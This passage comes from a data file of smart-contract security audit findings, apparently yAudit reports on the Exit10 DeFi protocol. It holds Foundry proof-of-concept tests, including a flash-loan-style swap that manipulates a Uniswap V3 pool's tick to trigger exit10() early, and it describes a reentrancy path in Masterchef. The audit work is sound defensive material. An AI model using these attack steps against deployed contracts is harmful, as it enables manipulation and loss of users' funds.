} _currentTick() is taken from slotO() function _currentTick() internal view returns (int24 _tick) { (, _tick, , , , , ) = POOL.slot0(); } The tick value returned by slotO() is the current tick and moves as the liquidity inside the pool is used up during swaps. If the USDC cumulated liquidity from the current price up to 10k is less than what can be obtained with a flash loan, then it is possible to take a flashloan and make a swap which will push the price beyond 10k. At this moment on Optimism there is: 3.24M of USDC liquidity on UniV3 WETH/USDC 500 pool 8M USDC available to borrow on AaveV3 The following PoC shows how a 4M USDC to ETH swap will manipulate the current tick to more than -184210 (corresponds to 10k on Optimism). function testManipulate() public { console2.log(\"block number:\", block.number); (uint160 sqrtPriceX96Init, int24 tickInit, , , , , ) = pool.slot0(); // Take USDC from a large holder instead of flashloan for simplicity address atck = address(0xEbe80f029b1c02862B9E8a70a7e5317C06F62Cae); uint value = 4_000_000 * 1e6; vm.startPrank(atck); IERC20(pool.token1()).approve(address(router), value); ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams( pool.token1(), // USDC pool.token0(), // WETH 500, atck, block.timestamp, value, 0, 0 ); router.exactInputSingle(params); vm.stopPrank(); (uint160 sqrtPriceX96Fin, int24 tickFin, , , , , ) = pool.slot0(); console2.log(\"tickInit:\", tickInit); console2.log(\"tickFin:\", tickFin); } which outputs: Logs: block number: 95682224 tickInit: -201109 tickFin: -102138 Full PoC file here: https://gist.github.com/bahurum/9daac43a30cd67fe02453a58a52645b5 At any time, an attacker can take a flashloan, swap USDC to ETH, trigger exit10() and swap ETH back to USDC on the pool. Note that this may not yield any profit for the attacker (who would have to pay at least for flash loan fees), but the result is that the protocol ends sooner than expected.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "15. Use _collect() return values", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "_decreaseLiquidity() is called before each _collect() call (except one) to return the amount of each token that is passed to _collect(). However, after _collect() is called, it is assumed that the values passed as arguments to _collect() are equivalent to the values that are returned by _collect(). Looking at the Uniswap v3 NatSpec for the underlying NonfungiblePositionManager.collect(), the arguments are described as indicating the maximum amount of tokens to collect, and the return values from collect() indicate the actual value that is returned by the function. One example of this assumption is in bootstrapLock(). amountRemoved0 and amountRemoved1 are passed to _collect() as arguments and then are subtracted from amountAdded0 and amountAdded1. But because the arguments passed to _collect() are the maximum values that could be collected, the return values from _collect() should be what is subtracted from amountAdded0 and amountAdded1.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "16. No emergency function(s) to handle edge cases", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The Exit10 protocol is designed to be immutable, with renounceOwnership() calls in NFT.sol and FeeSplitter.sol. This immutability and the lack of emergency functions could result in locked funds due to uncontrollable external events. The funds that are locked until Exit10.exit10() is called include bootstrap funds, STO, and EXIT, which can only be withdrawn with bootstrapClaim(), stoClaim(), exitClaim(). Uniswap fees are currently passed on to liquidity providers. The Uniswap DAO has long discussed the idea of turning on the fee switch in order to direct some of these fees to Uniswap token holders. This change could substantially impact the fees earned by liquidity providers and may therefore change the assumptions in the Exit10 protocol. A similar result could happen if other events, such as a Uniswap hack or a better AMM, causes the ETH-USDC pool to generate substantially lower fees than estimated. Regardless of what actually happens, the assumption that the underlying Uniswap LP positions will generate fees when held in Exit10 depends on external factors not under control of the protocol. If these assumptions change, it may be useful to allow for emergency withdrawal of funds even before ETH reaches 10k. Another edge case that may occur is if ETH never reaches 10k. While this is a very pessimistic case, external factors like new laws banning certain cryptocurrencies, hacks, hard forks, or other factors could impact the price of ETH and when it might reach 10k. If the price of ETH does not reach 10k before the hardcoded deadline timestamp, which is in the year 2286, the funds will be locked. Another edge case is if a USDC depeg event happens. This could cause the price of ETH in the Uniswap pool to appear to rise above 10k, but in actuality the price of ETH may only be at a lower value such as $8000. A final edge case is that one of the Uniswap contracts behind a proxy, such as the Uniswap v3 Router, may undergo a change that is not backwards compatible. While this is unlikely to happen, a security vulnerability or unexpected DAO vote could cause this to happen.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "17. Inelegant rounding solution", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The purpose of _safeTokenClaim() is to burn all tokens held by a user and to return the quantity of rewards the user can claim. The calculation of claimable rewards due to the user is a 2-step process. In the first step, the user's claimable rewards is calculated as the fraction of final totalSupply that msg.sender owns. This calculation is similar to how ERC4626 asset <-> share conversion happens in functions such as convertToShares() and convertToAssets(). The second step is to modify the value of the user's claimable rewards if the total claimed rewards (including the amount that is claimed in the active transaction) exceeds the total supply of rewards that exist. The fact that this second step exists implies that the protocol could encounter a situation where the outstanding rewards exceed the rewards that the protocol can afford to payout, which means that at least one user owed rewards will not receive their full amount of rewards. The way the logic works could lead to a bank run scenario, where user(s) who are late to redeem their rewards don't receive the full value of their rewards. While it is not clear under what circumstance this line of logic would be needed, a better design is one like ERC4626 that manages the rounding up or down appropriately and never reaches a bank run type scenario where some users do not receive the expected amount of value due to rounding error accumulation.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "18. Incentive tokens EXIT, BOOT exposed to frontrunning", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "There is a limited supply of EXIT tokens. If a user converts a bond with convertBond() and _mintExitCapped() is called when mintAmount evaluates to zero or when the amount of EXIT to be minted updates to MAX_EXIT_SUPPLY - EXIT.totalSupply() instead of the original amount input argument, then the user may end up receiving less EXIT tokens than they expected (with a worst case of receiving zero EXIT). The process of increasing EXIT.totalSupply() to the MAX_EXIT_SUPPLY is at risk of being frontrun if a user is converting a bond in the same block as another user. The same frontrun risk exists with BOOT tokens in bootstrapLock(). Once bootstrapBucket increases to the value of BOOTSTRAP_CAP or near this value, a user calling bootstrapLock() may receive less BOOT tokens than expected (with a worst case of receiving zero BOOT). This means that user calls to bootstrapLock() (and also calls to swapAndBootstrapLock()) could be frontrun with the user receiving less BOOT than expected. The risk of frontrunning bootstrapLock() to claim BOOT is greater than the risk of frontrunning convertBond() to claim EXIT, because only users with existing bonds can call convertBond().", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "19. Incorrect PROTOCOL_GUILD address for multichain deployment", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "PROTOCOL_GUILD is hardcoded to 0xF29Ff96aaEa6C9A1fBa851f74737f3c069d4f1a9 in this line. But checking the Optimism blockchain scanner and Arbitrum blockchain scanner shows there is no contract deployed to these addresses. Any funds sent to this address on chains other than mainnet will not be useful to the Protocol Guild. The Protocol Guild only takes donations on Ethereum mainnet.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "20. High hardcoded slippage", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The slippage can be changed to a lower value. It won't cause the protocol to become stuck because FeeSplitter.sol uses function updateFees(uint256 swapAmountOut) to swap which has an input parameter. If the liquidity gets too low, and defined slippage is too high, input swapAmountOut can be decreased to complete the swaps.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "21. Bootstrap rewards are shared", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "When a user locks in an amount for bootstrapping, they transfer in USDC and WETH in order to add liquidity to the pool. BOOT tokens are then minted to the user 1:1 for the amount of liquidity they were able to add to the pool. Regardless of when a user locks into bootstrapping, they are minted the same ratio of BOOT as the original entrants. After the protocol has performed an Exit10 and a user goes to claim their BOOT, they are given USDC based on the ratio of the BOOT they own to the size of the bootstrap bucket. This means that fees generated during the bootstrap period are distributed to all bootstrappers, penalizing the early bootstrappers.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "22. Possible loss of funds with price limited swaps through DepositHelper", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In DepositHelper._depositAndSwap() a user can provide TOKEN_IN and TOKEN_OUT at a certain ratio and make the contract perform a swap with _swapParams in order to provide liquidity at a different ratio. Let's say that _swapParams.tokenIn == TOKEN_0. The issue is that the contract assumes that _swapParams.amountIn is fully used for the swap and computes the amount to provide as liquidity as _initialAmount0 - _swapParams.amountIn (DepositHelper.sol#L85-L91). if (_swapParams.tokenIn == TOKEN_0) { _initialAmount0 -= _swapParams.amountIn; _initialAmount1 += amountOut; } else { _initialAmount1 -= _swapParams.amountIn; _initialAmount0 += amountOut; } Here is a PoC that demonstrates the issue: function testPriceLimitSwaps() public { _skipBootstrap(); uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(tickUpper); (uint160 sqrtRatioX96, int24 tick, , , , , ) = IUniswapV3Pool(vm.envAddress('POOL')).slot0(); console.log(\"initial USDC balance of DepositHelper:\", ERC20(usdc).balanceOf(address(depositHelper))); console.log(\"sqrtRatioX96:\", sqrtRatioX96); (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity( sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e15); // amounts to obtain 1e15 liquidity uint256 swapAmount0 = convert1ToToken0(sqrtRatioX96, amount1, 6); // usdc amount to swap ERC20(usdc).transfer(alice, amount0 + swapAmount0); // give usdc to alice IUniswapV3Router.ExactInputSingleParams memory swapParams = _getSwapParams( usdc, weth, swapAmount0); swapParams.sqrtPriceLimitX96 = TickMath.getSqrtRatioAtTick(tick - 1); console.log(\"alice sends\", amount0 + swapAmount0, \"USDC\"); console.log(\"and swaps\", swapAmount0, \"USDC for ETH\"); console.log(\"swapParams.sqrtPriceLimitX96 set to:\", swapParams.sqrtPriceLimitX96); vm.startPrank(alice); ERC20(usdc).approve(address(depositHelper), amount0 + swapAmount0); depositHelper.swapAndCreateBond(amount0 + swapAmount0, 0, swapParams); vm.stopPrank(); uint256 usdcLeft = ERC20(usdc).balanceOf(address(depositHelper)); console.log(\"Only\", swapAmount0 - usdcLeft, \"USDC has been swapped and used to mint bonds\"); console.log(\"USDC Left into DepositHelper:\", usdcLeft); } which outputs: Logs: initial USDC balance of DepositHelper: 0 sqrtRatioX96: 1980704062856608439838598758400000 alice sends 41638723701 USDC and swaps 24004813136 USDC for ETH swapParams.sqrtPriceLimitX96: 1980530912134207514651007739210316 Only 5701654427 USDC has been swapped and used to mint bonds USDC Left into DepositHelper: 18303158709 Full PoC file here: https://gist.github.com/bahurum/96a5a6c2082b81712392924cd2e673fd.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "23. Relying on hardcoded values can save gas", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The variables TOKEN_IN and POOL are immutable in Exit10.sol. In UniswapV3Pool.sol the variables token1 and token0 are immutable. Because these values are not changing, branching logic like this if statement can be removed and simplified because the same logic path will always be followed because immutable variables cannot change after deployment. The same applies to places where POOL.token0() is used, it can be replaced with TOKEN_IN or TOKEN_OUT to remove an external call.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "24. Unnecessary 1e18 decimals multiplication", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "_getAccruedLiquidity() multiplies 1e18 by the value of block.timestamp - _params.startTime so that the resulting bondDuration variable has decimals of 1e18. But this is unnecessary because in the next line of code, the presence of bondDuration in the numerator and denominator means these decimals will cancel each other out. The code can be simplified and one multiplication operation removed by keeping the original decimals that block.timestamp has.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "25. Pass _liquidityAmount() to collectFees() for 2nd argument", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The only place where the remainingBuckets argument is used in on lines of code like pendingBucket + remainingBuckets. This summation should return the same value as Exit10._liquidityAmount(), so pass _liquidityAmount() instead of bootstrapBucket + reserveBucket + _exitBucket() as the 2nd parameter to FeeSplitter.collectFees() to save gas. Even better, cache _liquidityAmount() instead of calling the internal function multiple times.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "26. Remove function used only once", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Functions _getDiscountedExitAmount() and _getLiquidityForBootsrapTarget() are used only once. They can be removed and their code can be inlined to the only place where they are used. This will save gas without sacrificing readability if the variable naming is in line. The same is true of _transferAmountIn() in AMasterchefBase, it is only used in deposit().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "27. Remove unused variables", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "State variable FACTORY is defined and used only in constructor() and can be removed. State variable bootstrapDeposit is not used at all and can be removed.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "28. Remove unneeded variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "There is no need to store deployment timestamp because this information can be retrieved from deployed block. This value is not used in any function and can be removed. Small change is required in Exit10.sol. - DEPLOYMENT_TIMESTAMP = block.timestamp; - BOOTSTRAP_PERIOD = params_.bootstrapPeriod; + BOOTSTRAP_PERIOD = params_.bootstrapPeriod + block.timestamp; Additional gas saving will be in dropping add operation at L554: - return (block.timestamp < DEPLOYMENT_TIMESTAMP + BOOTSTRAP_PERIOD); + return (block.timestamp < BOOTSTRAP_PERIOD);", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "29. Struct packing", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The allocPoint and lastUpdateTime elements are currently uint256, however, allocPoint appears unlikely to exceed 100 and lastUpdateTime is only required to be as large as necessary to hold updated block.timestamp values. Given this, it may be reasonable to combine these two with the token address in order to have all three occupy only a single slot in storage.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "30. Skip double fetching of the same value", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "All functions that call _updatePool() already fetch the value from the storage, except _massUpdatePools() which can be easily changed to fetch the value from the storage. This will save gas on every call of _updatePool().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "31. Use Shift Left instead of Multiplication if possible", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In the file FeeSplitter.sol:125: -uint256 mc0TokenIn = (pendingBucketTokenIn * 4) / 10; // 40% +uint256 mc0TokenIn = (pendingBucketTokenIn << 2) / 10; // 40% In the file Exit10.sol:608: -_stoRewards = tenPercent * 2; +_stoRewards = tenPercent << 1;", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "32. Cache state variables", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In exitClaim() and stoClaim() the state variables EXIT and STO (respectively) are loaded three times, rather than being cached in a local variable.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "33. Redundant check in cancelBond()", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "When a user cancels their bond, the amount of liquidity that they provided initially is removed from Uniswap, in order to pay them back. The _decreaseLiquidity() function requires a parameter of type RemoveLiquidity. In order to save gas, it is possible to remove the check _requireEqualValues and instead update the memory param parameter with bond.bondAmount.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "34. >= costs less gas than >.", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The compiler uses opcodes GT and ISZERO for solidity code that uses >, but only requires LT for >=, which saves 3 gas. File: Exit10-code/exit10-protocol/src/AMasterchefBase.sol 215: if (_poolLastUpdateTime > periodFinish) return 0; File: Exit10-code/exit10-protocol/src/Exit10.sol 177: if (bootstrapBucket > BOOTSTRAP_CAP) { 482: uint256 liquidityPerExit = actualLiquidityPerExit > projectedLiquidityPerExit 529: uint256 mintAmount = newSupply > MAX_EXIT_SUPPLY ? MAX_EXIT_SUPPLY - EXIT.totalSupply() : amount; 566: if (TOKEN_IN > TOKEN_OUT) {", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "35. Standardize ProcessEth implementation", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Compare the implementations of _processEth(): DepositHelper implementation, without an event UniswapBase implementation, without an event", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. Consider else if instead of else for stricter checks", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Some else branches might be best changed to else if branches to ensure that no unexpected edge cases trigger the else case. For example: This else branch could be replaced with else if (POOL.token0() == TOKEN_IN) This else branch could be replaced with else if (_swapParams.tokenIn == TOKEN_1)", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. Possibly unnecessary event emit", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The MintExit event is emitted in _mintExitCapped(). This is the only event emitted in an internal function of Exit10.sol. It is emitted even when no EXIT token is minted. Instead, consider expanding the if statement to determine if EXIT is minted to include this emit. Another side effect of this emit is that it is duplicating the emit in ERC20._mint(), so each minting event will have 2 emits. Consider whether this is the intended result for minting EXIT tokens.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Revert on zero case", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Consider the implementation of _safeTransferToken(): function _safeTransferToken(address _token, address _recipient, uint256 _amount) internal { if (_amount != 0) IERC20(_token).safeTransfer(_recipient, _amount); } If _amount is zero, _safeTransferToken() will not revert, but means any functions calling _safeTransferToken() will continue executing. This is similar behavior to phantom functions, an area of research that dedaub previously found a novel security issue with. Because there should be no changes when an amount of zero is involved, reverting will save the user gas and also prevent later logic from executing unexpectedly.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Replace modifiers", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "NFT.sol and FeeSplitter.sol implement an onlyAuthorized modifier. This modifier can be replaced with internal functions in the same way that _requireExitMode(), _isBootstrapOngoing(), and similar internal functions are implemented in Exit10.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Missing NatSpec", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "NatSpec is a good way to explain your code to other developers modifying or forking a project, to users who want to understand what the contracts are doing, and to auditors who are trying to determine whether the contract logic is implemented properly. The contracts of Exit10 have a severe lack of detailed NatSpec comments which makes it harder to understand the developer's intentions.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Use abstract contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Defining contract that is not deployed as abstract is a good practice to avoid confusion.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "42. Solidity version", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Solidity version 0.8.0 introduced a lot breaking changes. It would be good to define the same Solidity version for all contracts. Version above 0.8.0 don't need imported SafeMath library and abicoder v2 is enabled by default.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "43. Non-descriptive variable and function names", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Some variable names could be improved: exitBucketFinal set in exit10() is a very confusing name for a variable that contains the liquidity of the exit bucket and the bootstrap bucket. Consider changing the variable name to exitBucketBootstrapBucketFinal. exitBucketRewards is the amount of withdrawn USDC from the exitBucketFinal liquidity amount. This liquidity amount includes the exit bucket and bootstrap bucket liquidity so it would be better named exitBucketBootstrapBucketRewards. _getActualLiquidityPerExit is the estimated liquidity per EXIT token assuming MAX_EXIT_SUPPLY of EXIT is minted and redeemed. This is not always a valid assumption, because MasterchefExit.stopRewards() will burn the undistributedRewards if periodFinish is not reached. This function would be better named _getActualLiquidityPerExitAfterPeriodFinish. BOOTSTRAP_TARGET and BOOTSTRAP_CAP would be better described by the names BOOTSTRAP_LIQUIDITY_TARGET and BOOTSTRAP_LIQUIDITY_CAP. percentFromTaget would be better described with percentFromBootstrapTarget. _getPercentFromTarget() can return values that represent over 100%, so the word \"percent\" should be removed from the name of this function because a value representing 100% is meaningless. Consider instead getDollarPerExit() or getValuePerExit().", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "44. Outdated documentation", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The documentation describing the Exit10 buckets could be improved by adding a section for the bootstrap bucket.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "45. Replace magic numbers with constants", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The value 5000 appears on this line of Exit10.sol but there is no explanation for what this value represents. It looks like it represents the value 50% with a PERCENT_BASE of 10_000, but it turns out the 5000 value has nothing to do with a percentage. Instead, it helps set the price floor of the EXIT token, and a percentage over 100% only signifies a higher price. A constant variable with a clear name would make it easier to understand what is happening in this function. Arguably the", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "46. Typos", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The _getLiquidityForBootsrapTarget function name was missing a t in Bootstrap and so was this comment. In addition, variable percentFromTaget on Exit10.sol lines 479 and 480 has a typo, it should be percentFromTarget instead.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "47. Unclaimed rewards can be added to user's reward debt", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The _safeClaimRewards function calculates the amount of underlying reward tokens a user may claim for their staked position. This function is called during deposit or withdraw operations. It sets the claimable amount to the lesser of the remaining rewards in the contract or the user's eligible rewards. It then transfers this amount to the user. In both the deposit and withdraw functions, the rewardDebt is then set to be eligible for 0 rewards regardless of the results of the claimed rewards.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "48. Remove unnecessary address casting", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In the file AMasterchefBase.sol there are multiple unnecessary address casting at L51 and L121.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "49. Remove unnecessary virtual marker", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The function _updateUndistributedRewards() can drop the virtual marker because it is not overridden in child contract.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "50. Potentially unnecessary line of code", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "It is likely that this line of logic in MasterchefExit is never reached. In fact, if it is reached it means that the Masterchef contract has accumulated debt by paying out more rewards than it should have. If this scenario ever occurs, it means there is a problem with another part of the protocol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "51. (Out of scope file) Ensure that Bond NFT contract is initialized with non-zero TRANSFER_LOCKOUT_PERIOD_SECONDS", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Bond NFTs are tradeable ERC721s that represent the holder's share of the liquidity in the protocol's pendingBucket. When a user converts or cancels the bond, the NFT still exists but has its status in Exit10's idToBondData mapping changed to converted/canceled, rendering it unusable for protocol functions. To avoid situations where a user converts/cancels their bond and immediately sells it to an unsuspecting buyer, the following check in NFT.sol#beforeTokenTransfer() exists: require( status == uint8(Exit10.BondStatus.active) || block.timestamp >= endTime + TRANSFER_LOCKOUT_PERIOD_SECONDS, 'NFT: Cannot transfer during lockout period' ); In the current tests, the value of TRANSFER_LOCKOUT_PERIOD_SECONDS is initialized to zero. This would allow a malicious user to bypass the lockout period and sell their bond immediately.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "52. Potential lock funds if USDC implements taking fee mechanism in the future", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "USDC contract is now using proxy pattern, which indeed could change business logic in the future. In case USDC takes fee on transfers before ETH 10k, Exit10 users can not claim total amount of USDC from system, i.e. at least the latest user can not claim his full amount because contract balance deducted by fee from earlier claim", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "53. Bonds may convert less EXIT tokens than users expect", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The summation of convertible liquidity can exceed the cap EXIT token cap: $$\\sum_{i=1}^n (\\frac{l_{it}}{r_{it}}) \\geq E_S$$ Where: $l_{it}$ is the convertible liquidity of bond $i$ at time $t$; $r_{it}$ is the rate of liquidity per EXIT token that bond $i$ will receive at time $t$; $E_s$ is the EXIT token supply cap. The rate of liquidity per token for a bond at time ${t}$ to receive $r_{it}$ is the larger of two values: the projected liquidity per token $r_p$ and actual liquidity per token $r_a$. The formula for $r_p$ is: $$r_p=p_t*L_{USDC}$$ Where: ${p_t}$ is the percentage of collected bootstrap liquidity to its target, floored to 50%. In other words, if less than 50% of the target was reached, $p_t=0.5$. $L_{USDC}$ is a constant: the projected amount of liquidity per USDC; For $r_a$ the formula is: $$r_a=\\frac{e_l}{E_s}$$ Where: $e_l$ is the available liquidity to be claimed by EXIT holders from the exit bucket (i.e. 70% of the exit bucket); $E_s$ is the exit token supply cap. To break the invariant and fall in the case where the token cap exceeds we assume: Less than or 50% of the bootstrap target was reached (i.e. $p_t=0.5$); Not enough liquidity accumulated in the exit bucket and $r_a<=r_p$. So we have: $$r_p=r_a=\\frac{L_{USDC}}{2} = \\frac{e_l}{E_s}=r_{it}$$ The amount of EXIT tokens a bond $i$ is entitled to at time $t$ (before the discount is added) $e_i$ is: $$e_i=\\frac{l_{it}}{r_{it}}$$ The convertible liquidity cap (i.e. the point from which the entire EXIT supply is minted and all other bonds receive 0 EXIT tokens per liquidity) can be defined by setting the amount of tokens received to the supply $e_i=E_s$. Solving for $r_p$ and $r_a$: $$e_i=\\frac{2*l_{it}}{L_{USDC}} =\\frac{l_{it}}{e_l}*E_s=E_s$$ From here, we can make two observations: If the ratio between the bond's convertible liquidity $l_{it}$ to the liquidity in the exit bucket $e_l\\geq 1$ or; If the bond's convertible liquidity $l_{it} \\geq \\frac{E_s*L_{USDC}}{2}$ , i.e. $l_{it} \\geq 6437989144.5 * 10^7$ assuming 10mi EXIT. The bond would mint the entire EXIT supply and all bonds will receive 0 EXIT on conversion. Note: To simplify modeling we are using one massive bond, but this behavior is equivalent if the liquidity is split in multiple bonds. In other words, the two observations above still apply if we replace $l_{it}$ with $\\sum_{k=1}^n(l_{it})$ as what matters is that the aggregate convertible liquidity. Note that as the code is, people can still create new bonds even after the supply cap is reached.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "54. Masterchef is vulnerable to reentrancy attacks", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In both functions, rewards are sent to the caller before state is updated to reflect the claim. If the implementation of the reward token contains callbacks or hooks that would grant control to the caller, such as an ERC777, then it is possible to execute a reentrancy attack to steal the reward tokens from the contract. Using the withdraw() as an example, we can see that tokens are transferred in line 101 and state is updated in lines 103-105. 094: function withdraw(uint256 pid, uint256 amount) public { 095: PoolInfo storage pool = poolInfo[pid]; 096: UserInfo storage user = userInfo[pid][msg.sender]; 097: _updatePool(pid); 098: 099: amount = Math.min(user.amount, amount); 100: 101: _safeClaimRewards(pid, _getUserPendingReward(user.amount, user.rewardDebt, pool.accRewardPerShare)); 102: 103: user.amount -= amount; 104: user.rewardDebt = (user.amount * pool.accRewardPerShare) / PRECISION; 105: pool.totalStaked -= amount; 106: _transferAmountOut(pool.token, amount); 107: 108: emit Withdraw(msg.sender, pid, amount); 109: } If the caller receives control during the call to _safeClaimRewards() (which transfers the reward token), an attacker can reenter the function and execute the claim again, since the state hasn't been updated yet, in particular line 104 which tracks how many rewards have been already sent to the user. A test with a proof of concept for this issue is available here.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "55. Event not emitted when adding a token.", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "55. Event not emitted when adding a token.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "56. Centralization risk during protocol bootstrap", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "During bootstrap, different contracts need to be created separately by the deployer of the protocol before they are put together in their final configuration. During this period of time, the deployer is the owner of these contracts that are later transferred to the Exi10.sol contract. BLP, STO, BOOT and EXIT tokens used in the protocol are created during the initialization. As these contracts grant the owner the ability to arbitrarily mint tokens, a malicious deployer can mint any number of tokens they want before transferring control to the main contract. Another example attack would be to backdoor the Masterchef.sol or MasterchefExit.sol contracts by configuring another pool with a fake token, which can then be used to steal rewards.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Incorrect order of operations in LibCompound.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The problematic computations are for the variables interestAccumulated and the return value. interestAccumulated calculation from transmissions11/libcompound repo: uint256 interestAccumulated = (borrowRateMantissa * (block.number - accrualBlockNumberPrior)).mulWadDown( borrowsPrior ); interestAccumulated calculation from local LibCompound.sol contract: uint256 interestAccumulated = borrowRateMantissa * block.number - accrualBlockNumberPrior.mulWadDown(borrowsPrior); Made up example values: borrowRateMantissa = 1000000000 block.number = 15460000 accrualBlockNumberPrior = 15459990 borrowsPrior = 500000000000000000000000 interestAccumulated result from transmissions11/libcompound: 5000000000000000 interestAccumulated result from local LibCompound.sol: 15452270005000000 Return value calculation from transmissions11/libcompound repo: (totalCash + 